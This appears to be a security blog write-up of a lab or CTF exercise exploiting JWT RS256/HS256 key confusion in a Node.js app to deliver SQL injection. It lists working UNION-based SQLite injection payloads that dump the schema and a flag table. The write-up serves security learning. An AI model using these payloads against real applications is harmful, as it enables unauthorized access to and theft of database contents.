[back](/)

### SQL injection in Node.js webapp and JSON Web Tokens (JWT)

What JSON Web Token (JWT) is? It is an open standard [RFC 7519](https://tools.ietf.org/html/rfc7519) for creating access tokens, in accordance with which information is transmitted in the form of a JSON object. JSON signature algorithms are used to secure the transmission of such information. More information at: [jwt.io](https://jwt.io/introduction/). There are a number of interesting techniques for exploiting vulnerabilities in JWT, but in this example I would like to show the "RS/HS256 public key mismatch vulnerability" and SQL injection exploitation through this vulnerability.

In this example there is a server with a Node.js runtime and a SQLite database, here is the example of authorization and receipt of JWT:

![Image](/img/RS_HS256/auth_jwt.png)

JWT consists of three parts: Header, Payload, Verify Signature, encoded in Base64 format:

![Image](/img/RS_HS256/jwt_decode.png)

In the process of examining the code of the Node.js web application, a fragment of an SQL query was found with the direct inclusion of the value of the parameter, which is controlled by the user: $ {username}:

![Image](/img/RS_HS256/auth_code.png)

![Image](/img/RS_HS256/vuln_code.png)


To investigate possible SQL injection and JWS token signing via "RS / HS256 public key mismatch" I used [jwt_tool](https://github.com/ticarpi/jwt_tool) tool. To generate payload, it need to change the value of the "username" parameter and then sign the JWS using public.key:

![Image](/img/RS_HS256/jwtool_1.png)

![Image](/img/RS_HS256/jwtool_pub_key_sign.png)

The SQL injection research process was accompanied by the use of the following payloads:

The answer 200 means there is an SQL injection:
```
"username" : "jaki' and 1=1 -- -"
```

![Image](/img/RS_HS256/jwtool_true_sqli.png)

![Image](/img/RS_HS256/valid_jwt_200.png)

Number of columns in error for UNION SELECT structure:
```
"username" : "' order by 5; -- -"
```

![Image](/img/RS_HS256/jwtool_sqli_2.png)

![Image](/img/RS_HS256/sqli_union_columns.png)

SQLite version:
```
"username" : "' union select 1,sqlite_version(),3; -- -"
```

![Image](/img/RS_HS256/jwtool_sqli_3.png)

![Image](/img/RS_HS256/sqli_ver.png)

List of all database objects and the SQL request used to create each object:
```
"username" : "' union select  1,(SELECT group_concat(sql) FROM sqlite_master),3; -- -"
```

![Image](/img/RS_HS256/jwtool_sqli_4.png)

![Image](/img/RS_HS256/sqli_master.png)


Retrieving sensitive information from the target table:
```
"username" : "' union select  1,(SELECT group_concat(top_secret_flaag) FROM flag_storage),3; -- -"
```

![Image](/img/RS_HS256/jwtool_sqli_5.png)

![Image](/img/RS_HS256/sqli_flag.png)


<div id="disqus_thread"></div>
<script>
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://hackitfaster-hopto-org.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

[back](/)